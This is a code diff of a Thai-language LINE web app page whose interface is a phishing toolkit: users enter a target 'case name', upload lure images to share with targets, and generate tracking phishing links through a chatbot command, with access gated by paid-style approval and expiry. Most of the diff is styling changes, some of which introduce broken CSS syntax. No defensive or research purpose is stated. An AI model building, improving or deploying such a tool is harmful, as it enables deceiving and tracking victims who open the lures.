@@ -45,7 +45,6 @@
             padding: 0;
             margin: 0;
             min-height: 100vh;
-            -webkit-tap-highlight-color: transparent; /* ลบเอฟเฟกต์การกดบนมือถือ */
         }
 
         .app-container {
@@ -69,7 +68,6 @@
             align-items: center;
             justify-content: center;
             gap: 15px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
 
         .header::after {
@@ -140,12 +138,6 @@
             transition: var(--transition-normal);
             position: relative;
             overflow: hidden;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
         }
 
         .user-info::before {
@@ -183,7 +175,6 @@
 
         .user-info:hover .profile-img {
             transform: scale(1.05) rotate(5deg);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
         }
 
         .user-info .user-name {
@@ -212,7 +203,7 @@
 
         .badge.approved {
             background-color: rgba(76, 175, 80, 0.15);
-            color: var(--success-color);
+            color: var (--success-color);
             border: 1px solid rgba(76, 175, 80, 0.3);
         }
 
@@ -231,12 +222,6 @@
             border-radius: 4px;
             position: relative;
             transition: var(--transition-normal);
-            animation: slideIn 0.4s ease-out;
-        }
-
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateX(-20px); }
-            to { opacity: 1; transform: translateX(0); }
         }
 
         .message-box:before {
@@ -275,32 +260,9 @@
             color: #721c24;
         }
 
-        .message-box.error:before {
-            content: '\f057';
-            color: var(--error-color);
-        }
-
         /* Form Elements */
         .form-group {
             margin-bottom: 24px;
-            animation: fadeInUp 0.5s ease forwards;
-            opacity: 0;
-        }
-
-        .form-group:nth-child(1) { animation-delay: 0.1s; }
-        .form-group:nth-child(2) { animation-delay: 0.2s; }
-        .form-group:nth-child(3) { animation-delay: 0.3s; }
-        .form-group:nth-child(4) { animation-delay: 0.4s; }
-
-        @keyframes fadeInUp {
-            from { 
-                opacity: 0;
-                transform: translateY(15px);
-            }
-            to { 
-                opacity: 1;
-                transform: translateY(0);
-            }
         }
 
         label {
@@ -310,7 +272,7 @@
             color: var(--text-color);
             font-size: 16px;
             position: relative;
-            padding-left: 12px;
+            padding-left: 8px;
         }
 
         label:before {
@@ -319,8 +281,8 @@
             left: 0;
             top: 50%;
             transform: translateY(-50%);
-            width: 4px;
-            height: 16px;
+            width: 3px;
+            height: 14px;
             background-color: var(--primary-color);
             border-radius: 2px;
         }
@@ -371,7 +333,6 @@
         .image-preview-container:hover {
             border-color: var(--primary-color);
             background-color: rgba(88, 136, 231, 0.05);
-            transform: translateY(-2px);
         }
 
         .image-preview {
@@ -385,7 +346,7 @@
         }
 
         .image-preview:hover {
-            transform: scale(1.03);
+            transform: scale(1.02);
             box-shadow: var(--shadow-md);
         }
 
@@ -405,12 +366,6 @@
             color: var(--primary-light);
             display: block;
             margin-bottom: 10px;
-            transition: all 0.3s ease;
-        }
-
-        .image-preview-container:hover #uploadPrompt:before {
-            transform: translateY(-5px);
-            color: var(--primary-color);
         }
 
         .btn {
@@ -429,7 +384,6 @@
             position: relative;
             overflow: hidden;
             z-index: 1;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
 
         .btn:before {
@@ -456,12 +410,12 @@
         .btn:hover {
             background-color: var(--primary-dark);
             transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            box-shadow: var(--shadow-md);
         }
 
         .btn:active {
             transform: translateY(0);
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            box-shadow: var (--shadow-sm);
         }
 
         .btn:disabled {
@@ -472,17 +426,13 @@
             transform: none;
         }
 
-        .btn:disabled:before {
-            display: none;
-        }
-
         .btn .icon {
             margin-right: 8px;
         }
 
         .btn-file {
             background-color: var(--secondary-color);
-            color: var(--primary-dark);
+            color: var (--primary-dark);
             margin-bottom: 15px;
             display: flex;
             align-items: center;
@@ -516,7 +466,6 @@
             display: none;
             position: relative;
             animation: fadeIn 0.3s forwards;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
         }
 
         @keyframes fadeIn {
@@ -555,7 +504,6 @@
             display: none;
             text-align: center;
             margin: 25px 0;
-            animation: fadeIn 0.5s;
         }
 
         .loader-spinner {
@@ -586,16 +534,10 @@
             margin: 25px 0;
             position: relative;
             transition: var(--transition-normal);
-            animation: fadeInUp 0.6s ease forwards;
-            animation-delay: 0.5s;
-            opacity: 0;
-            box-shadow: 0 1px 4px rgba(0,0,0,0.03);
         }
 
         .tips:hover {
             background-color: rgba(88, 136, 231, 0.12);
-            transform: translateY(-2px);
-            box-shadow: 0 3px 8px rgba(0,0,0,0.05);
         }
 
         .tips p {
@@ -637,18 +579,12 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            background-color: #FFFFFF;
             display: flex;
             justify-content: center;
             align-items: center;
             flex-direction: column;
             z-index: 1000;
-            transition: all 0.5s ease;
-        }
-
-        #loadingScreen.hide {
-            opacity: 0;
-            visibility: hidden;
         }
 
         #loadingScreen .spinner {
@@ -700,91 +636,20 @@
             }
         }
         /* ปรับแต่งปุ่ม toggle โหมด */
-        .mode-btn-container {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+        .mode-btn.active {
+            box-shadow: 0 2px 8px rgba(56,118,191,0.08);
+            border: none !important;
         }
-        
         .mode-btn {
-            flex: 1;
-            padding: 10px;
-            text-align: center;
             font-weight: 600;
             letter-spacing: 0.2px;
-            border: none;
-            background: #f5f5f5;
-            color: #777;
-            transition: all 0.25s ease;
-            position: relative;
-            overflow: hidden;
-            cursor: pointer;
+            border: 1px solid #3876BF;
+            background: #fff;
+            color: #3876BF;
+            transition: all 0.2s;
         }
-        
-        .mode-btn:first-child {
-            border-radius: 8px 0 0 8px;
-        }
-        
-        .mode-btn:last-child {
-            border-radius: 0 8px 8px 0;
-        }
-        
-        .mode-btn.active {
-            background: var(--primary-color);
-            color: white;
-            box-shadow: 0 2px 10px rgba(56,118,191,0.3);
-            transform: scale(1.03);
-        }
-        
         .mode-btn:not(.active):hover {
-            background: #e8e8e8;
-            color: #555;
-        }
-        
-        .mode-btn i {
-            margin-right: 6px;
-            font-size: 14px;
-            transition: transform 0.2s;
-        }
-        
-        .mode-btn:hover i {
-            transform: translateY(-2px);
-        }
-        
-        .mode-btn:after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 5px;
-            height: 5px;
-            background: rgba(255, 255, 255, 0.5);
-            opacity: 0;
-            border-radius: 100%;
-            transform: scale(1, 1) translate(-50%);
-            transform-origin: 50% 50%;
-        }
-        
-        .mode-btn:focus:not(:active)::after {
-            animation: ripple 1s ease-out;
-        }
-        
-        @keyframes ripple {
-            0% {
-                transform: scale(0, 0);
-                opacity: 0.5;
-            }
-            20% {
-                transform: scale(25, 25);
-                opacity: 0.3;
-            }
-            100% {
-                opacity: 0;
-                transform: scale(40, 40);
-            }
+            background: #f0f6ff;
         }
     </style>
 </head>
@@ -811,14 +676,14 @@
             <!-- ส่วนแสดงข้อมูลผู้ใช้ -->
             <div class="user-info" id="userInfoSection" style="display: none;">
                 <div class="profile">
-                    <img id="profileImage" src="https://via.placeholder.com/60" alt="Profile" class="profile-img">
+                    <img id="profileImage" src="" alt="Profile" class="profile-img">
                     <div>
                         <div class="user-name" id="userName">User Name</div>
                         <div class="user-status">
                             <span><i class="fas fa-circle-info"></i> สถานะ:</span> <span id="userStatus">ตรวจสอบสิทธิ์...</span>
                             <span id="statusBadge" class="badge">รอตรวจสอบ</span>
                         </div>
-                        <!-- ส่วนแสดงวันหมดอายุ -->
+                        <!-- เพิ่มส่วนแสดงวันหมดอายุ -->
                         <div class="user-status" id="expirationDate" style="display: none; margin-top: 5px; font-size: 13px; color: #666;">
                             <i class="fas fa-clock"></i> ไม่มีข้อมูลวันหมดอายุ
                         </div>
@@ -833,65 +698,64 @@
             
             <!-- เพิ่ม toggle โหมดฟิชชิ่ง -->
             <div class="form-group" style="margin-bottom: 28px;">
-                <div class="mode-btn-container" id="modeToggle">
-                    <button id="modeImageBtn" class="mode-btn active">
-                        <i class="fas fa-image"></i> โหมดรูปภาพ
-                    </button>
-                    <button id="modeLinkBtn" class="mode-btn">
-                        <i class="fas fa-link"></i> โหมดลิงก์
-                    </button>
+                <div id="modeToggle" style="display: flex; gap: 10px; justify-content: center; margin-bottom: 0;">
+                    <button id="modeImageBtn" class="btn mode-btn active" type="button" style="flex:1;background:linear-gradient(90deg,#3876BF,#192655);color:#fff;">ฟิชชิ่งแบบรูปภาพ</button>
+                    <button id="modeLinkBtn" class="btn mode-btn" type="button" style="flex:1;background:#fff;color:#3876BF;border:1px solid #3876BF;">ฟิชชิ่งแบบลิงก์</button>
                 </div>
             </div>
             
             <!-- ฟอร์มหลัก (แยก 2 โหมด) -->
             <div id="mainFormImage">
                 <div class="form-group">
-                    <label for="caseName">ชื่อเคส/เป้าหมาย</label>
-                    <input type="text" id="caseName" placeholder="ระบุชื่อเคสหรือเป้าหมาย เช่น ชื่อผู้ถูกตั้งเป้า" autocomplete="off">
+                    <label for="caseName">ชื่อเคส</label>
+                    <input type="text" id="caseName" placeholder="ระบุชื่อหรือรายละเอียดเคส" required>
                 </div>
                 
                 <div class="form-group">
-                    <label for="imageUpload">เลือกรูปภาพล่อเป้าหมาย</label>
-                    <input type="file" id="imageUpload" accept="image/*" style="display: none;">
-                    <button id="selectImageBtn" class="btn btn-file">
+                    <label for="imageUpload">สร้างรูปภาพที่ส่งไปยังเป้าหมาย</label>
+                    <button class="btn btn-file" id="selectImageBtn">
                         <i class="fas fa-image icon"></i> เลือกรูปภาพ
                     </button>
+                    <input type="file" id="imageUpload" accept="image/*" style="display: none;">
+                    
                     <div class="image-upload-container">
                         <div class="image-preview-container">
+                            <img id="imagePreview" class="image-preview">
                             <div id="uploadPrompt">
-                                ลากรูปภาพมาวางที่นี่ หรือคลิกเพื่อเลือกรูปภาพ
+                                <span>คลิกหรือลากรูปภาพมาที่นี่</span>
+                                <span style="font-size: 0.9em; opacity: 0.8;">รองรับไฟล์ JPG, PNG, GIF</span>
                             </div>
-                            <img id="imagePreview" class="image-preview" alt="รูปภาพตัวอย่าง">
                         </div>
                     </div>
                 </div>
                 
                 <div class="loader">
                     <div class="loader-spinner"></div>
-                    <p>กำลังอัปโหลดรูปภาพ...</p>
+                    <p>กำลังอัพโหลดรูปภาพ...</p>
                 </div>
                 
                 <div id="statusMessage" class="status"></div>
                 
                 <button class="btn btn-share" id="shareBtn" disabled>
-                    <i class="fas fa-share-alt"></i> สร้างและแชร์รูปภาพ
+                    <i class="fas fa-paper-plane"></i> แชร์ภาพฟิชชิ่งไปยังเป้าหมาย
                 </button>
                 
                 <div class="tips">
-                    <p>เลือกรูปภาพที่น่าสนใจและใส่ชื่อเคสให้ชัดเจนเพื่อความสะดวกในการติดตามผล</p>
+                    <p><strong>คำแนะนำ:</strong> เลือกรูปภาพที่น่าสนใจไปยังเป้าหมาย <span style="color:#EE0000;font-weight:bold;">มีขนาดรูปไม่ใหญ่เกินไป</span> เพื่อให้เซิฟเวอร์โหลดได้อย่างรวดเร็ว</p>
+                    <p><strong>คำเตือน:</strong><span style="color:#EE0000;font-weight:bold;"> โหมดฟิชชิ่งด้วยรูปภาพรองรับเฉพาะแอพพลิเคชั่นไลน์เท่านั่น!!!</span></p>
                 </div>
             </div>
             <div id="mainFormLink" style="display:none;">
                 <div class="form-group">
-                    <label for="linkCaseName">ชื่อเคส/เป้าหมาย</label>
-                    <input type="text" id="linkCaseName" placeholder="ระบุชื่อเคสหรือเป้าหมาย" autocomplete="off">
+                    <label for="caseNameLink">ชื่อเคส</label>
+                    <input type="text" id="caseNameLink" placeholder="ระบุชื่อหรือรายละเอียดเคส" required>
                 </div>
                 <div id="statusMessageLink" class="status"></div>
                 <button class="btn btn-share" id="genLinkBtn" type="button" style="margin-top:20px;">
-                    <i class="fas fa-link"></i> สร้างลิงก์ล่อเป้าหมาย
+                    <i class="fas fa-link"></i> สร้างลิงก์ฟิชชิ่ง
                 </button>
                 <div class="tips">
-                    <p>ลิงก์จะถูกสร้างขึ้นพร้อมระบบติดตาม และคุณสามารถแชร์ลิงก์ไปยังเป้าหมายได้ทันที</p>
+                    <p><strong>คำแนะนำ:</strong> ระบบจะสร้างลิงก์ฟิชชิ่งโดยอัตโนมัติ โปรดตั้ง <span style="color:#3876BF;font-weight:bold;">[ชื่อเคส]</span> ให้เหมาะสม เพื่อง่ายต่อการจดจำและการค้นหาของคุณ</p>
                 </div>
             </div>
         </div>
@@ -959,19 +823,13 @@
                 userHasPermission = await checkUserPermission(userId);
                 
                 if (userHasPermission) {
+                    // มีสิทธิ์ใช้งาน
                     document.getElementById('userStatus').textContent = 'ได้รับอนุมัติแล้ว';
                     document.getElementById('statusBadge').textContent = 'อนุมัติแล้ว';
                     document.getElementById('statusBadge').className = 'badge approved';
-                    
-                    // แสดงวันหมดอายุหากมี
-                    if (expirationStatus && expirationStatus !== "ไม่มีข้อมูลวันหมดอายุ" && expirationStatus !== "ไม่มีวันหมดอายุ") {
-                        const expElement = document.getElementById('expirationDate');
-                        expElement.innerHTML = `<i class="fas fa-clock"></i> ${expirationStatus}`;
-                        expElement.style.display = 'block';
-                    }
-                    
                     enableForm();
                 } else {
+                    // ไม่มีสิทธิ์ใช้งาน
                     document.getElementById('userStatus').textContent = 'รอการอนุมัติ';
                     document.getElementById('statusBadge').textContent = 'รออนุมัติ';
                     document.getElementById('statusBadge').className = 'badge pending';
@@ -981,22 +839,20 @@
                 
                 isLiffInitialized = true;
                 
-                // ซ่อน loading screen ด้วย animation
-                const loadingScreen = document.getElementById('loadingScreen');
-                loadingScreen.classList.add('hide');
-                setTimeout(() => {
-                    loadingScreen.style.display = 'none';
-                }, 500);
+                // ตรวจสอบพารามิเตอร์ caseName จาก URL
+                const urlParams = new URLSearchParams(window.location.search);
+                const caseNameParam = urlParams.get('case');
+                if (caseNameParam) {
+                    document.getElementById('caseName').value = caseNameParam;
+                }
+                
+                // ซ่อนหน้าโหลดดิ้ง
+                document.getElementById('loadingScreen').style.display = 'none';
                 
             } catch (error) {
                 console.error('LIFF initialization failed', error);
+                showStatus('เกิดข้อผิดพลาดในการเริ่มต้น LIFF: ' + error.message, false);
                 document.getElementById('loadingScreen').style.display = 'none';
-                
-                // แสดงข้อความแจ้งเตือนข้อผิดพลาด
-                const errorMessage = document.createElement('div');
-                errorMessage.className = 'message-box error';
-                errorMessage.innerHTML = `<p>เกิดข้อผิดพลาดในการเริ่มต้นระบบ: ${error.message}</p>`;
-                document.querySelector('.content').insertBefore(errorMessage, document.querySelector('.content').firstChild);
             }
         }
         
@@ -1201,20 +1057,18 @@
         // เปิดใช้งานฟอร์ม
         function enableForm() {
             document.getElementById('caseName').disabled = false;
-            document.getElementById('linkCaseName').disabled = false;
             document.getElementById('selectImageBtn').disabled = false;
-            document.getElementById('genLinkBtn').disabled = false;
+            document.getElementById('genLinkBtn').disabled = false; // เพิ่มการเปิดใช้ปุ่มสร้างลิงก์
             checkCanShare();
-            checkCanGenLink();
+            checkCanGenLink(); // เพิ่มการตรวจสอบปุ่มสร้างลิงก์
         }
         
         // ปิดใช้งานฟอร์ม
         function disableForm() {
             document.getElementById('caseName').disabled = true;
-            document.getElementById('linkCaseName').disabled = true;
             document.getElementById('selectImageBtn').disabled = true;
             document.getElementById('shareBtn').disabled = true;
-            document.getElementById('genLinkBtn').disabled = true;
+            document.getElementById('genLinkBtn').disabled = true; // เพิ่มการปิดปุ่มสร้างลิงก์
         }
         
         // ตั้งค่า Event Listeners
@@ -1641,10 +1495,9 @@
         
         // เพิ่มฟังก์ชันใหม่: ตรวจสอบว่าสามารถสร้างลิงก์ได้หรือไม่
         function checkCanGenLink() {
-            const linkCaseName = document.getElementById('linkCaseName').value;
             const genLinkBtn = document.getElementById('genLinkBtn');
             
-            if (userHasPermission && linkCaseName) {
+            if (userHasPermission) {
                 genLinkBtn.disabled = false;
             } else {
                 genLinkBtn.disabled = true;
@@ -1785,105 +1638,68 @@
             const modeLinkBtn = document.getElementById('modeLinkBtn');
             const mainFormImage = document.getElementById('mainFormImage');
             const mainFormLink = document.getElementById('mainFormLink');
-            
+
             modeImageBtn.addEventListener('click', function() {
                 phishingMode = "image";
                 modeImageBtn.classList.add('active');
+                modeImageBtn.style.background = "linear-gradient(90deg,#3876BF,#192655)";
+                modeImageBtn.style.color = "#fff";
                 modeLinkBtn.classList.remove('active');
-                mainFormImage.style.display = 'block';
+                modeLinkBtn.style.background = "#fff";
+                modeLinkBtn.style.color = "#3876BF";
+                mainFormImage.style.display = '';
                 mainFormLink.style.display = 'none';
                 checkCanShare();
             });
-            
             modeLinkBtn.addEventListener('click', function() {
                 phishingMode = "link";
                 modeLinkBtn.classList.add('active');
+                modeLinkBtn.style.background = "linear-gradient(90deg,#3876BF,#192655)";
+                modeLinkBtn.style.color = "#fff";
                 modeImageBtn.classList.remove('active');
-                mainFormLink.style.display = 'block';
+                modeImageBtn.style.background = "#fff";
+                modeImageBtn.style.color = "#3876BF";
                 mainFormImage.style.display = 'none';
+                mainFormLink.style.display = '';
                 checkCanGenLink();
             });
-            
-            // เพิ่ม event listener สำหรับคำสั่งสร้างลิงก์
-            document.getElementById('linkCaseName').addEventListener('input', checkCanGenLink);
         }
 
         // --- เพิ่มฟังก์ชันสำหรับโหมดลิงก์ ---
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('genLinkBtn').addEventListener('click', async function() {
-                if (!isLiffInitialized) {
-                    showStatusLink("กรุณารอการเริ่มต้นระบบ", false);
-                    return;
-                }
-                
+                // ตรวจสอบสิทธิ์ก่อนดำเนินการสร้างลิงก์
                 if (!userHasPermission) {
-                    showStatusLink("คุณไม่มีสิทธิ์ใช้งานระบบนี้", false);
+                    showStatusLink("คุณไม่มีสิทธิ์ใช้งานหรือสิทธิ์หมดอายุ", false);
                     return;
                 }
-                
-                const caseName = document.getElementById('linkCaseName').value;
+                const caseName = document.getElementById('caseNameLink').value.trim();
                 if (!caseName) {
-                    showStatusLink("กรุณาระบุชื่อเคส", false);
+                    showStatusLink('กรุณาระบุชื่อเคส', false);
                     return;
                 }
-                
                 try {
-                    // สร้าง tracking key
-                    const trackingKey = generateTrackingKey();
-                    
-                    // บันทึกข้อมูล tracking key และ case name
-                    await saveTrackingCaseMapping(trackingKey, caseName);
-                    
-                    // สร้าง URL พร้อม tracking key
-                    const phishingUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`;
-                    
-                    // แสดงลิงก์และให้ผู้ใช้คัดลอก
-                    const resultMessage = `<div style="margin-bottom:10px">ลิงก์ถูกสร้างเรียบร้อย:</div>
-                                         <div style="background:#f5f5f5;padding:10px;border-radius:5px;margin-bottom:10px;word-break:break-all;font-size:14px">
-                                         ${phishingUrl}</div>
-                                         <button id="copyLinkBtn" style="background:#3876BF;color:white;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;margin-top:5px">
-                                         <i class="fas fa-copy"></i> คัดลอกลิงก์</button>`;
-                    
-                    showStatusLink(resultMessage, true);
-                    
-                    // เพิ่ม event listener สำหรับปุ่มคัดลอก
+                    // ส่งข้อความ #genlink <ชื่อเคส> ไปยังแชทบอทส่วนตัว
+                    await liff.sendMessages([{
+                        type: 'text',
+                        text: `#genlink ${caseName}`
+                    }]);
+                    showStatusLink('ส่งคำสั่งสร้างลิงก์สำเร็จ กรุณารอรับลิงก์ในแชทบอท', true);
                     setTimeout(() => {
-                        const copyLinkBtn = document.getElementById('copyLinkBtn');
-                        if (copyLinkBtn) {
-                            copyLinkBtn.addEventListener('click', function() {
-                                navigator.clipboard.writeText(phishingUrl).then(() => {
-                                    this.innerHTML = '<i class="fas fa-check"></i> คัดลอกแล้ว';
-                                    this.style.background = '#4CAF50';
-                                    setTimeout(() => {
-                                        this.innerHTML = '<i class="fas fa-copy"></i> คัดลอกลิงก์';
-                                        this.style.background = '#3876BF';
-                                    }, 2000);
-                                });
-                            });
-                        }
-                    }, 100);
-                    
-                    // อาจเพิ่มโค้ดเพื่อรีเซ็ตฟอร์มในภายหลัง
-                    // document.getElementById('linkCaseName').value = '';
-                    
-                } catch (error) {
-                    console.error("เกิดข้อผิดพลาดในการสร้างลิงก์:", error);
-                    showStatusLink("เกิดข้อผิดพลาด: " + error.message, false);
+                        liff.closeWindow();
+                    }, 1200);
+                } catch (err) {
+                    showStatusLink('เกิดข้อผิดพลาดในการส่งคำสั่ง: ' + (err.message || err), false);
                 }
             });
         });
 
         function showStatusLink(message, isSuccess) {
             const statusEl = document.getElementById('statusMessageLink');
-            statusEl.innerHTML = message;
+            statusEl.textContent = message;
             statusEl.style.display = 'block';
             statusEl.className = isSuccess ? 'status success' : 'status error';
-            
-            if (!message.includes('copyLinkBtn')) {
-                setTimeout(() => {
-                    statusEl.style.display = 'none';
-                }, 4000);
-            }
+            setTimeout(() => { statusEl.style.display = 'none'; }, 4000);
         }
     </script>
 </body>
